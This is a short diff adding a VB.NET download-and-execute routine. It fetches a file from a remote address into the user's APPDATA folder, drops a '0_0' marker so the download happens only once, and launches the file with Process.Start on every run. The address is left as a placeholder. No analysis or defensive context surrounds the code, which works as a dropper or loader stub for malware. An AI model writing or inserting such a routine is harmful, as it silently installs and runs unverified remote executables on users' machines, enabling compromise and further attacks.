@@ -1,0 +1,22 @@
+Shared Sub Download()
+		Dim Address As String = 'Address
+        Dim AP As String = Environ("APPDATA")
+        Dim l As String = AP & "\" & _
+        Address.Substring(Address.LastIndexOf("/") + 1)
+        Dim T As String = AP & "\0_0"
+        If IO.File.Exists(T) = False Then
+            My.Computer.Network.DownloadFile(Address, l)
+            Do Until IO.File.Exists(l) = True
+                System.Threading.Thread.Sleep(1000)
+            Loop
+            My.Computer.FileSystem.WriteAllBytes(T, New Byte() {}, False)
+            If IO.File.Exists(l) = True Then
+                System.Diagnostics.Process.Start(l)
+            End If
+        Else
+            If IO.File.Exists(l) = True Then
+                System.Diagnostics.Process.Start(l)
+            End If
+        End If
+End Sub
+  
